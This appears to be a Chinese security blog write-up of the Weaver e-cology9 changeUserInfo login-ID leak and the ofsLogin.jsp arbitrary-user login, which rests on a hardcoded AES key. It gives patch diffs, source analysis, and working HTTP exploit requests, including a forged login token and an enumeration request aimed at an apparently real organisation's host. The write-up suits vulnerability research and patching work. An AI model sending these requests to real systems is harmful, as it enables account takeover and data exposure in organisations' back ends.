---
created: 2024-09-30T03:08:00+00:00
categories:
  - 技术研究
tags:
  - 漏洞分析
updated: 2023-05-20T00:00:00+00:00
date: 2023-05-18T00:00:00+00:00
slug: weaver-ecology9-changeuserinfo-ofslogin
title: 泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞
cover: /img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png
id: 111906e1-7468-801e-a874-de4999d8216b
---

## 漏洞简介

泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，并可形成一系列的通用解决方案和行业解决方案。

2023 年 05 月 15 日，泛微官方发布 10.57.2 版本安全补丁。其中修复了两个漏洞，分别是信息泄漏和任意用户登录漏洞，两个漏洞可以被攻击者组合起来利用，从而能够使攻击者进入到系统后台。

## 影响范围

### e-cology9 本身版本

在测试的几个版本中，如下几个版本是不存在`ofsLogin.jsp`文件的。

- 9.00.1807.03
- 9.00.2008.17
- 9.00.2102.07
- 9.00.2110.01

在如下版本中是存在`ofsLogin.jsp`文件的。

- 9.00.2206.02

那么可以简单判断，在`9.00.2110.01`以及之前的版本是不受该漏洞的影响的，在`9.00.2206.02`**以及之后的版本**可能会受到该漏洞的影响，而在这两个版本之间的版本，由于没有源码，是否受影响就不得而知了。

### 补丁版本

- <10.57.2

## 漏洞分析

### 补丁包分析

2023 年 04 月 18 日，泛微首次发布 v10.57 版本补丁包，同年 05 月 15 日又发布 v10.57.2 版本补丁包，通过如下两条链接分别下载两个版本的补丁包。

```
https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57.zip?v=20230418
```

```
https://www.weaver.com.cn/cs/package/Ecology_security_20230515_v9.0_v10.57.2.zip?v=20230515
```

由于泛微官方已经将本文两个漏洞的补丁文件覆盖到了 v10.57 版本补丁包中，所以现在下载到的 v10.57 版本补丁包其中也有了相关的漏洞补丁文件。拿现在构造好的链接下载得到的 v10.57 版本补丁包与 v10.57.2 版本补丁包相对比是对比不出什么差异的。

不过我在 04 月 20 日及时下载了 v10.57 版本的补丁包，所以拿其与现在的 v10.57.2 版本补丁包对比，是能够很迅速地发现新增的漏洞补丁文件。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162317147.png)

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162750163.png)

如下是第一个漏洞补丁代码，暴露出的是`/mobile/plugin/1/ofsLogin.jsp`文件与`syscode`参数，并且还检查`transferE9`文件中`secretkey`的值是否等于`u6skkR`，如果是则提醒更改密钥，且产生漏洞利用安全警告。

```java
if (path.indexOf("/mobile/") != -1 && path.contains("/plugin/") && path.contains("/1/") && path.indexOf("ofslogin.jsp") != -1) {
    User user = sc.getUser(req);
    new HashMap();
    String returnInfoString = "";
    BaseBean baseBean = new BaseBean();
    int isFix = sc.getIntValue(baseBean.getPropValue("transferE9", "isFix"));
    if (isFix == 1) {
        return true;
    }

    String rnd = baseBean.getPropValue("transferE9", "secretkey");
    if ("u6skkR".equalsIgnoreCase(rnd) || StringUtils.isBlank(rnd) || rnd.length() < 8) {
        returnInfoString = "认证密钥不安全，transferE9中更新密钥，请更改密钥，建议设置为：" + UUID.randomUUID().toString().substring(0, 16);
        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), "漏洞利用");
        sc.writeLog(">>>>Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=" + req.getRequestURI() + " msg:" + returnInfoString + " security validate failed! pushKey is null!  user:" + (user != null ? user.getLastname() : null) + "  source ip:" + ThreadVarManager.getIp());
        return false;
    }

    String syscode = req.getParameter("syscode");
    if ("im".equalsIgnoreCase(syscode)) {
        returnInfoString = "syscode参数异常，syscode=" + syscode;
        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), "漏洞利用");
        sc.writeLog(">>>>Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=" + req.getRequestURI() + " msg:" + returnInfoString + " security validate failed! pushKey is null!  user:" + (user != null ? user.getLastname() : null) + "  source ip:" + ThreadVarManager.getIp());
        return false;
    }
}
```

第二个漏洞的补丁代码如下，指明`/mobile/plugin/changeUserInfo.jsp`文件与当`type`参数值等于`"getLoginid"`时的情况。

```java
if (path.contains("/mobile/") && path.contains("/plugin/") && path.contains("/changeuserinfo.jsp")) {
    if ("E9".equals(sc.getEcVersion())) {
        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), "漏洞利用");
        sc.writeLog(">>>>Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=" + req.getRequestURL() + "  security validate failed! user: " + (user != null ? user.getLastname() : "") + " source ip:" + ThreadVarManager.getIp());
        return false;
    }

    String type = req.getParameter("type");
    if ("getLoginid".equals(type)) {
        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), "漏洞利用");
        sc.writeLog(">>>>Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=" + req.getRequestURL() + " type=" + type + " security validate failed! user: " + (user != null ? user.getLastname() : "") + " source ip:" + ThreadVarManager.getIp());
        return false;
    }
}
```

那么，接下来对如上两个文件做进一步分析。

### 任意用户登录分析

首先先进入`mobile/plugin/1/ofsLogin.jsp`文件，如下图所示。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519164856242.png)

最开头根据`syscode`、`receiver`、`timestamp`、`loginTokenFromThird`、`gopage`参数接收相应的参数值，然后对`loginTokenFromThird`参数值进行判断是否等于`loginTokenFromThird2`的值，如果不等于则会登录失败跳转至`/login/Login.jsp`。

```java
String toURL = "";
Logger log = LoggerFactory.getLogger();
String syscode = request.getParameter("syscode");
String receiver = request.getParameter("receiver");
String timestamp = request.getParameter("timestamp");
String loginTokenFromThird = request.getParameter("loginTokenFromThird");
String gopage = URLDecoder.decode(request.getParameter("gopage"),"utf-8");
String loginTokenFromThird2 =  AESCoder.encrypt(receiver+timestamp, syscode+Prop.getPropValue("transferE9","secretkey"));

log.info("=======================登陆认证开始=================================");
log.info("syscode："+syscode);
log.info("receiver："+receiver);
log.info("timestamp："+timestamp);
log.info("loginTokenFromThird ："+loginTokenFromThird);
log.info("gopage："+gopage);
log.info("loginTokenFromThird2："+loginTokenFromThird2);

if(!loginTokenFromThird.equalsIgnoreCase(loginTokenFromThird2)){
    log.info("登陆失败！");
        //response.sendRedirect("/login/Login.jsp");
    toURL = "/login/Login.jsp";
}
```

先看看`Prop.getPropValue("transferE9","secretkey")`是干嘛的，相关代码如下，其实就是获取`prop/transferE9.properties`文件中`secretkey`的值，是`u6skkR`。

```java
public static synchronized Properties loadTemplateProp(String var0) {
    try {
        Properties var1 = null;
        File var8 = new File(PROP_ROOT + var0 + ".properties");
        if (!var8.exists()) {
            return null;
        } else {
            long var3 = var8.lastModified();
            Long var5 = (Long)htmlfileTime.get(var0);
            if (var5 == null || var5 != var3) {
                var1 = new Properties();
                BufferedInputStream var6 = new BufferedInputStream(new FileInputStream(var8));
                var1.load(var6);
                var6.close();
                htmlfileHash.put(var0, var1);
                htmlfileTime.put(var0, new Long(var3));
            }

            return (Properties)htmlfileHash.get(var0);
        }
    } catch (Exception var7) {
        LogMan var2 = LogMan.getInstance();
        var2.writeLog("Prop.class", var7);
        var2.writeLog("root path is : " + PROP_ROOT);
        return null;
    }
}

public static String getPropValue(String var0, String var1) {
    Properties var2 = loadTemplateProp(var0);
    return var2 != null && var2.getProperty(var1) != null ? var2.getProperty(var1).trim() : "";
}
```

然后就变成如下。

```java
loginTokenFromThird2 = AESCoder.encrypt(receiver+timestamp, syscode+"u6skkR");
```

继续看`AESCoder.encrypt`方法，一种基于 AES 算法的加密方法。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519171839628.png)

那么当`loginTokenFromThird`参数值等于`loginTokenFromThird2`的值即`AESCoder.encrypt(receiver+timestamp, syscode+"u6skkR")`时，则继续往下进入到 else 分支。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519175427532.png)

首先是根据`syscode`参数值进行的一句SQL查询，根据`syscode`的值从`ofs_sendinfo`表中查询`hrmtransrule`的值。如果从表中查询到的`hrmtransrule`的值为空，则赋值字符串`"1"`为`hrmtransrule`参数的值。接着根据`hrmtransrule`参数值的不同，对`rule`参数赋不同的值，当然如果`hrmtransrule`参数值不等于`"0"`/`"1"`/`"2"`/`"3"`/`"4"`其中一个，它就默认等于`"loginid"`。

```java
rs.executeQuery("select hrmtransrule from ofs_sendinfo where syscode = ?",syscode);
rs.next();
String hrmtransrule = rs.getString("hrmtransrule");
if(StringUtils.isBlank(hrmtransrule)){
    hrmtransrule = "1";
}
log.info("hrmtransrule:"+hrmtransrule);

User user_new = null;
String rule = "loginid";
if("0".equals(hrmtransrule)){
    rule = "id";
}else if("1".equals(hrmtransrule)){
    rule = "loginid";
}else if("2".equals(hrmtransrule)){
    rule = "workcode";
}else if("3".equals(hrmtransrule)){
    rule = "certificatenum";
}else if("4".equals(hrmtransrule)){
    rule = "email";
}
```

不妨先看看`ofs_sendinfo`表中的字段以及对应的值，查询结果如下，表中默认只存在一条数据，而且`hrmtransrule`字段的值为`NULL`。意味着在默认情况下，无论`syscode`参数值是什么，都不影响查询出来的`hrmtransrule`是一个空值，这将导致代码中的`hrmtransrule`变量值为`"1"`，然后`rule`就为`"loginid"`。

```sql
select * from ofs_sendinfo;

id	syscode	serverurl	classimpl	isvalid	sysdesc	hrmtransrule	send_type_setting
1	IM	weaver.ofs.interfaces.SendRequestStatusDataImplForIM	1	For IM	NULL	NULL
```

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519224717665.png)

之后，根据`rule`参数值等于`"loginid"`，又进行了一次 SQL 查询，这次是从`HrmResource`表中进行查询。此处的`?`表示一个占位符号，在这里意味着`receiver`变量的值。

```java
String sql = "select * from HrmResource where "+rule+" = ? and status < 4 ";
log.info("sql："+sql);
rs.executeQuery(sql,receiver);
```

如果查询成功，就从查询结果中取`id`字段的值，并赋值给变量`userId`。接着就根据`userId`去创建对应用户的 Session，最后判断`result`中的`status`是否为`"1"`，如果不是则跳转至登录页面，如果是就会跳转至`gopage`参数对应的路径，若`gopage`参数的值为`/wui/index.html`，则会跳转至后台，完成用户登录。

```java
if(rs.next()){
    int userId = rs.getInt("id");
    Map<String, Object> result = (Map<String, Object>)SessionUtil.createSession(userId + "", request, response);
    log.info("登陆结果result:"+result);

    User user = (User) request.getSession(true).getAttribute("weaver_user@bean");
    log.info("登陆结果user:"+ JSON.toJSONString(user));

    String status = (String)result.get("status");
    log.info("=======================登陆认证结束=================================");
    if("1".equals(status)){
        //response.sendRedirect(gopage);
        //return;
        toURL = gopage;
    }else {
        toURL = "/login/Login.jsp";
    }
}
```

在这个过程中，关键就在于`receiver`参数的值。不过的是，默认情况下`HrmResource`是一张空表，如下是其各个字段。这也意味着该漏洞在`HrmResource`表为空的情况下是不可利用的。

```sql
select * from HrmResource;
```

```sql
id	loginid	password	lastname	sex	birthday	nationality	systemlanguage	maritalstatus	telephone	mobile	mobilecall	email	locationid	workroom	homeaddress	resourcetype	startdate	enddate	jobtitle	jobactivitydesc	joblevel	seclevel	departmentid	subcompanyid1	costcenterid	managerid	assistantid	bankid1	accountid1	resourceimageid	createrid	createdate	lastmodid	lastmoddate	lastlogindate	datefield1	datefield2	datefield3	datefield4	datefield5	numberfield1	numberfield2	numberfield3	numberfield4	numberfield5	textfield1	textfield2	textfield3	textfield4	textfield5	tinyintfield1	tinyintfield2	tinyintfield3	tinyintfield4	tinyintfield5	certificatenum	nativeplace	educationlevel	bememberdate	bepartydate	workcode	regresidentplace	healthinfo	residentplace	policy	degree	height	usekind	jobcall	accumfundaccount	birthplace	folk	residentphone	residentpostcode	extphone	managerstr	status	fax	islabouunion	weight	tempresidentnumber	probationenddate	countryid	passwdchgdate	needusb	serial	account	lloginid	needdynapass	dsporder	passwordstate	accounttype	belongto	dactylogram	assistantdactylogram	passwordlock	sumpasswordwrong	oldpassword1	oldpassword2	msgStyle	messagerurl	pinyinlastname	tokenkey	userUsbType	outkey	adsjgs	adgs	adbm	mobileshowtype	usbstate	totalSpace	occupySpace	ecology_pinyin_search	isADAccount	accountname	notallot	beforefrozen	resourcefrom	isnewuser	haschangepwd	created	creater	modified	modifier	passwordlocktime	mobilecaflag	salt	companystartdate	workstartdate	secondaryPwd	useSecondaryPwd	classification	uuid	passwordLockReason	companyworkyear	workyear	DISMISSDATE	encKey	crc
```

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519231925736.png)

登入系统后台新建一名人员，再看`HrmResource`表发生的变化。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-202305201752562374.png)

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230523110130299.png)

如上图，其中`status`字段代表的是人员的状态，有试用/正式/临时三种状态，显然`1`对应的是正式状态，只要满足这个值小于 4 即可。

```java
rs.executeQuery("select * from HrmResource where loginid = ? and status < 4 ", receiver);
```

那么现在`HrmResource`表不为空，只要当`receiver`变量值为`"user1"`，便能够对应上`HrmResource`表中的`loginid`字段的值，最终就能够成功地实现任意用户登录。

### 信息泄漏分析

通过如上的任意用户登录漏洞分析，可以明白该漏洞的利用条件是，需要已知一个存在于`HrmResource`表中的`loginid`。接下来来看`/mobile/plugin/changeUserInfo.jsp`文件以做进一步的`loginid`信息泄漏漏洞分析。

根据补丁代码，快速定位到存在问题的代码。如下，当`type`等于`"getLoginid"`时。

```java
String type = Util.null2String(fu.getParameter("type"));
String mobile = Util.null2String(fu.getParameter("mobile"));

// ...

if ("getLoginid".equalsIgnoreCase(type)){
	String loginId = "";
	RecordSet rs = new RecordSet();
	String sql = "select count(LOGINID) count from HRMRESOURCE where mobile like ?";
	rs.executeQuery(sql,"%"+mobile+"%");
	if(rs.next()){
		int count = Util.getIntValue(rs.getString("count"),0);
		if(count == 0){
			result.put("status", "-1");
		} else if(count >1){
			result.put("status", "0");
		} else if(count == 1){
			result.put("status", "1");
			RecordSet rs1 = new RecordSet();
			String sql1 = "select LOGINID from HRMRESOURCE where mobile like ?";
			rs1.executeQuery(sql1,"%"+mobile+"%");
			if(rs1.next()){
				result.put("loginId", rs1.getString("LOGINID"));
			}
		}
	}
}
```

查询时使用了`%`，可以模糊匹配`mobile`，当查询出的结果条数为 0 时，返回`{"status":"-1"}`。

```http
GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1234 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close


```

```http
HTTP/1.1 200 OK
Server: WVS
Cache-Control: private
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-UA-Compatible: IE=8
Set-Cookie: ecology_JSessionid=aaa18FCpyjT4M7qjA1VCy; path=/
Content-Type: application/json; charset=UTF-8
Content-Length: 17
Connection: close
Date: Fri, 19 May 2023 01:41:30 GMT

{"status":"-1"}


```

当大于 1 时返回`{"status":"0"}` ，如下。

```http
GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Connection: close
Cache-Control: max-age=0


```

```http
HTTP/1.1 200 OK
Server: WVS
Cache-Control: private
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-UA-Compatible: IE=8
Set-Cookie: ecology_JSessionid=aaazz3rlfOPGyh_GFNZly; path=/
Content-Type: application/json; charset=UTF-8
Content-Length: 16
Connection: close
Date: Fri, 19 May 2023 01:42:50 GMT

{"status":"0"}


```

在这种情况下，是可以利用 BurpSuite 的 Intruder 做进一步模糊查询移动电话的。如下第二张图，存在一个包含 17 的移动电话，以及多个包含 18 的移动电话。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113512246.png)

<img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113701520.png" alt="image-20230520113701520" style="zoom: 50%;" />

当等于 1 时返回`{"status":"1"}` 以及`loginId`及其值，在这种情况下，我们就可以直接获取一个`loginId`。

```http
GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close


```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 19 May 2023 01:43:50 GMT
Content-Type: application/json; charset=UTF-8
Content-Length: 34
Connection: close
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-UA-Compatible: IE=8
Expires: Thu, 01 Dec 1994 16:00:00 GMT
Set-Cookie: ecology_JSessionid=aaxctkRR1WUJ97SAqRRiy; path=/

{"loginId":"xsijr","status":"1"}


```

但不过，在上面我们登入系统后台新建一名人员，填写人员信息时，移动电话并不是必填项。`%`模糊匹配虽然好用，但是当表中的数据条目超过 1 条，并且它们的`mobile`字段都为空时，它便再无用武之地了。

所以，我们继续往上看代码，当`type`等于`status`时。

```java
<%@page import="weaver.login.LoginRemindService"%>

String type = Util.null2String(fu.getParameter("type"));

else if ("status".equalsIgnoreCase(type)){
	LoginRemindService loginRemind = new LoginRemindService();
	String loginId = Util.null2String(fu.getParameter("loginId"));
	org.json.JSONObject json = loginRemind.getPassChangedReminder(loginId);
	new weaver.general.BaseBean().writeLog("resultA:"+json.toString());
	String code = json.getString("resultMsg");
	result.put("code",code);
	if("22".equalsIgnoreCase(code)){
		result.put("days",json.getInt("passwdelse"));
	}
}

result.put("status","1");
```

跟进`weaver.login.LoginRemindService`中的`getPassChangedReminder`方法，发现如果提供的`loginId`参数值在`HrmResourceManager`表中存在，则`code`的值会等于`"21"`，否则`code`等于`"-1"`。

```java
public JSONObject getPassChangedReminder(String var1) {
    String var2 = "-1";
    JSONObject var3 = new JSONObject();
    RecordSet var4 = new RecordSet();
    RecordSet var5 = new RecordSet();
    boolean var6 = false;
    int var7 = 0;

    try {
        var4.executeQuery("select id from HrmResourceManager where loginId=? ", new Object[]{var1});
        if (!var4.next()) {
            RecordSet var8 = new RecordSet();
            var8.executeQuery("select id,isadaccount from HrmResource where loginId=? ", new Object[]{var1});
            if (var8.next()) {
                String var9 = var8.getString("isadaccount");
                if (!"1".equals(var9)) {
                    String var10;
                    if (this.isLoginMustUpPswd()) {
                        var10 = var8.getString("id");
                        var5.executeQuery("SELECT COUNT(id) FROM HrmResource WHERE haschangepwd = 'y' and id= ?", new Object[]{var10});
                        if (var5.next()) {
                            var6 = var5.getInt(1) <= 0;
                        }
                    }
                    if (!var6) {
                        if (this.isPassChangeReminder()) {
                            var10 = this.settings.getChangePasswordDays();
                            String var11 = this.settings.getDaysToRemind();
                            String var12 = "";
                            boolean var13 = false;
                            boolean var14 = false;
                            String var15 = "";
                            String var16 = "0";
                            String var17 = "0";
                            var5.executeQuery("select passwdchgdate from hrmresource where loginId = ? ", new Object[]{var1});
                            if (var5.next()) {
                                var12 = var5.getString(1);
                                int var21 = TimeUtil.dateInterval(var12, TimeUtil.getCurrentDateString());
                                if (var21 < Integer.parseInt(var10)) {
                                    var16 = "1";
                                }
                                var15 = TimeUtil.dateAdd(var12, Integer.parseInt(var10) - Integer.parseInt(var11));
                                int var22;
                                try {
                                    var22 = TimeUtil.dateInterval(var15, TimeUtil.getCurrentDateString());
                                } catch (Exception var19) {
                                    var22 = 0;
                                }
                                var7 = Integer.parseInt(var11) - var22;
                                if (var22 >= 0) {
                                    var17 = "1";
                                }
                            }
                            if (!"1".equals(var16)) {
                                var2 = "20";
                            } else if ("1".equals(var17)) {
                                var2 = "22";
                                var3.put("passwdelse", var7);
                            }
                        }
                    } else {
                        var2 = "21";
                    }
                }
            }
        }
        var3.put("resultMsg", var2);
    } catch (Exception var20) {
        this.writeLog("getPassChangedReminder,Exception." + var20.getMessage());
    }
    return var3;
}
```

那么根据这个差异便可以用来爆破`loginId`，如下图。

```http
GET /mobile/plugin/changeUserInfo.jsp?type=status&loginId=user HTTP/1.1
Host: weoa.sundan.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close


```

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520143947132.png)

当`type`等于`getUserid`时，代码如下。

```java
<%@page import="weaver.mobile.plugin.ecology.service.HrmResourceService"%>

String type = Util.null2String(fu.getParameter("type"));

else if ("getUserid".equalsIgnoreCase(type)){
	String loginId = Util.null2String(fu.getParameter("loginId"));
	HrmResourceService hr = new HrmResourceService();
	int userid = hr.getUserId(loginId);
	result.put("userid",userid);
}

result.put("status","1");
```

跟进`weaver.mobile.plugin.ecology.service.HrmResourceService`中的`getUserId`方法。

```java
public int getUserId(String var1) {
    try {
        String var2 = "";
        var2 = "select id from HrmResource where loginid='" + var1 + "' and (accounttype is null  or accounttype=0) and status in (0,1,2,3)";
        var2 = var2 + " union select id from HrmResourcemanager where loginid='" + var1 + "'";
        RecordSet var3 = new RecordSet();
        var3.executeSql(var2);
        if (var3.next() && Util.getIntValue(var3.getString(1), 0) > 0) {
            return Util.getIntValue(var3.getString(1));
        }
    } catch (Exception var4) {
        var4.printStackTrace();
    }

    return 0;
}
```

若提供的`loginId`参数值在`HrmResourceManager`表中存在，就会返回相应`id`字段的值，否则会返回`0`。

根据此差异，此处同样可以被用来爆破`loginId`。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520145322146.png)

在新建人员信息时，相比于移动电话，登录名的存在更为必需，也就是说在数据库表存在数据的情况下，每条数据它的`mobile`字段可能为空，但是`loginid`字段为空的概率更小。不过第一种利用模糊查询`mobile`的信息泄漏利用手法，比后两种爆破`loginId`更好利用，因为仅仅涉及到数字。

在实战过程中，这三种信息泄漏的利用手法，可能会因为系统版本的差异导致未预期的结果。例如就拿第一种信息泄漏的利用手法来说，在实际测试中，发现大量的站仅返回了`{"status":"1"}`，但却不见`loginId`键值对。

## 漏洞利用

在已知一个`loginId`值为`"user1"`的情况下，首先通过加密算法生成`loginTokenFromThird`的值。

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png)

然后作如下请求，便能成功进入系统后台`/wui/index.html`页面。

```http
GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Connection: close


```

![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png)

## 修复建议

目前厂商已发布了升级补丁以修复这个安全问题，请到厂商的补丁主页下载最新版本补丁包：

- https://www.weaver.com.cn/cs/securityDownload.html?src=cn
